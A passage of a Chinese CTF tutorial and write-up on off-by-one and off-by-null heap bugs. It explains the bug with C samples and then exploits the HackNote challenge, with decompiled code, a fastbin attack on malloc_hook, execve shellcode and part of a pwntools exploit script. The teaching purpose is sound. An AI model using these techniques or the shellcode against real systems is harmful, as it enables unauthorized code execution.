@@ -1,0 +1,586 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="43fb68394657862666c6d42aa6a97719">off by one &amp; off by null</h1>
+<h2 data-content="1" id="83b8ea3c42019fcc235e0f1c88a7e614">off by one</h2>
+<h3 data-content="1" id="b0e70a8f9343ca4bcd811481348aadce">简介</h3>
+<p>off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。这种漏洞的产生往往与边界验证不严和字符串操作有关，也不排除写入的size正好就只多了一个字节的情况。</p>
+<p>一般认为，单字节溢出是难以利用的，但是因为Linux的堆管理机制ptmalloc验证的松散性，基于Linux堆的off-by-one漏洞利用起来并不复杂，并且威力强大。</p>
+<p>off-by-one是可以基于各种缓冲区的，比如栈、bss段等等，但是堆上（heap based）的off-by-one是比较常见的。</p>
+<h3 data-content="1" id="a6167f9225e0bc8b8b7aa01e0cb2c3b2">漏洞成因</h3>
+<p>在程序设置循环读取时（例如C语言的for循环），由于对于循环次数的检查不够严格，导致读取溢出了一个字节</p>
+<p>例如：</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以看出其实这个循环进行了17次，多向a中读入了一个字节，造成了溢出，攻击者可以通过这个漏洞达成许多攻击效果</p>
+<h3 data-content="1" id="92bbf121fd0787547b4e1e86dadacd7d">利用姿势</h3>
+<h4 data-content="1" id="8fc2b56be41fb4c5423250a286cdaf58">1.通过溢出泄露数据</h4>
+<h5 data-content="1" id="e30f6fb9e1bc69af12a274914e2e0539">原理</h5>
+<p>这种方法主要与字符串函数有关，如printf函数的%s参数，通过将字符串末尾的‘\x00’覆盖掉从而使其能够输出该字符串之后的内容，造成内存地址的泄露</p>
+<p>例：</p>
+<p>源代码：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">a</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">a</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>溢出了一个字节，此时当我们输入17个字符的垃圾数据后，我们便可以通过溢出的那个字节覆盖使printf能够泄露之后的数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011313-d0bb5e28-570f-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011317-d362caa8-570f-1.png"/></p>
+<h4 data-content="1" id="e68b7c590b19b87c3894e0674e851812">2.一字节溢出覆盖其他块数据</h4>
+<p>这种漏洞利用方式在堆中利用较多，具体利用如下：</p>
+<h5 data-content="1" id="0a510b23f1da2760135be596892074ec">知识点补充及利用</h5>
+<p>堆chunk的结构：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011341-e1579242-570f-1.png"/></p>
+<p>glibc的堆管理器<strong>只通过size域</strong>的数据来判断chunk的大小，对于size域被篡改的情况基本上无法防御只能傻傻地将这块chunk“延长”，这就给off by one构造了攻击条件。</p>
+<p>在off by one的条件下通过一字节的溢出修改下一个堆块的size造成块结构之间出现重叠，即<strong>chunk overlap</strong>，以此可以达成另一种形式的UAF。</p>
+<p>什么是<strong>chunk overlap</strong><br/>
+假设我们申请了三个堆块Chunk A   Chunk B   Chunk C<br/>
+先释放chunkA，再释放chunkB，此时触发off by null修改chunkC的prev_inuse为前两个堆块大小的总和（包括chunk头）。接着释放chunkC，此时因为向后合并会获得一个大小为chunkA+chunkB+chunkC的堆块。由于chunkB其实并不是free的，接着再把chunkB申请回来，这是我们就可以对chunkB进行任意构造了。</p>
+<h3 data-content="1" id="f47dd570b14d59b7eef7bc9a14014b65">[湖湘杯 2019]HackNote</h3>
+<h4 data-content="1" id="c822b8cc5c6650535132e7cbeeacac92">ida</h4>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rdi</span>
+  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rdx</span>
+  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx</span>
+  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// r8d</span>
+  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// r9d</span>
+  <span class="kt">char</span> <span class="n">v9</span><span class="p">[</span><span class="mi">908</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-390h] BYREF</span>
+  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+3ACh] [rbp-4h]</span>
+
+  <span class="n">init</span><span class="p">();</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="s">"Welcome to Hacker's Note"</span><span class="p">;</span>
+  <span class="n">writing</span><span class="p">(</span><span class="s">"Welcome to Hacker's Note"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">menu</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+      <span class="n">v4</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">();</span>
+      <span class="n">v10</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+      <span class="n">delete</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">v3</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+        <span class="n">edit</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">writing</span><span class="p">(</span><span class="s">"see u ~"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+          <span class="n">sub_40F090</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="nl">LABEL_13</span><span class="p">:</span>
+        <span class="n">v3</span> <span class="o">=</span> <span class="s">"Invaild choice!"</span><span class="p">;</span>
+        <span class="n">writing</span><span class="p">(</span><span class="s">"Invaild choice!"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+      <span class="n">add</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">add</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a4</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a5</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a6</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rdx</span>
+  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rdx</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-1Ch]</span>
+  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]</span>
+
+  <span class="n">v10</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v10</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+      <span class="n">a2</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+      <span class="n">sub_40FE90</span><span class="p">(</span><span class="s">"You Get Index : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">);</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"List Full !"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Input the Size:"</span><span class="p">);</span>
+    <span class="n">v9</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">();</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">v8</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_41EA20</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="mi">8LL</span> <span class="o">*</span> <span class="n">v10</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v10</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">v10</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">))</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+      <span class="n">writing</span><span class="p">(</span><span class="s">"Input the Note:"</span><span class="p">);</span>
+      <span class="n">readfile</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v10</span> <span class="o">+</span> <span class="n">a1</span><span class="p">),</span> <span class="n">v9</span><span class="p">);</span>
+      <span class="n">writing</span><span class="p">(</span><span class="s">"Add Done!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">writing</span><span class="p">(</span><span class="s">"Allocation Failed !"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">delete</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="n">writing</span><span class="p">(</span><span class="s">"Input the Index of Note:"</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_400B04</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Invaild !!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">)</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">sub_41EDC0</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span>
+    <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Delete Done!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="n">writing</span><span class="p">(</span><span class="s">"Input the Index of Note:"</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_400B04</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Invaild !!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Input the Note:"</span><span class="p">);</span>
+    <span class="n">readfile</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">)</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">))</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v2</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span><span class="c1">//计算chunk内容的长度，会造成off by one</span>
+    <span class="n">writing</span><span class="p">(</span><span class="s">"Edit Done!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<h4 data-content="1" id="f6b0832b90ef6bcb5c468f6332f8a2e7">分析</h4>
+<p>静态编译的堆题 保护全关 没有 show 功能。</p>
+<p>在 edit 功能中chunk 的 size 会根据 strlen 函数而修改，那么如果我们将下一个相邻的 chunk 的 prev size 填满，那么 strlen 计算的时候就会算上下一个相邻 chunk 的 size 头的8字节，就会造成 off by one 漏洞了。</p>
+<h4 data-content="1" id="39a120b6ad9763cb177e3d7cf2cc7de4">过程</h4>
+<div class="highlight"><pre><span></span><span class="c1">#first : off by one -&gt; chunk overlap</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1">#index 0</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#index 1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#index 2</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#index 3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1">#Index 4</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+<span class="c1">#off by one</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>
+<span class="c1">#dbg()</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011406-f071f862-570f-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1">#fastbin attack</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="mh">0x6CB788</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x16</span><span class="p">))</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011416-f61e300a-570f-1.png"/></p>
+<p>改fd为malloc_hook</p>
+<div class="highlight"><pre><span></span><span class="c1"># change malloc_hook to shellcode</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05</span><span class="s1">'</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011426-fc211256-570f-1.png"/></p>
+<p>改malloc_hook为shellcode，再add一次即可getshell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230920011433-005a46ee-5710-1.png"/></p>
+<h4 data-content="1" id="e16e9ff5c95c5d3b1506df44551a152f">exp</h4>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">r</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">pr</span><span class="p">()</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">inter</span><span class="p">()</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">get_addr</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">get_sb</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
+
+
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./hacknote'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./hacknote'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4. Exit</span><span class="se">\n</span><span class="s1">-----------------</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Size:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Note:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4. Exit</span><span class="se">\n</span><span class="s1">-----------------</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Note:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'4. Exit</span><span class="se">\n</span><span class="s1">-----------------</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'3'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Note:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Note:</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="mh">0x6CB788</span>  
+
+<span class="c1"># first : off by one -&gt; chunk overlap</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1">#index 0</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1">#index 1</span>
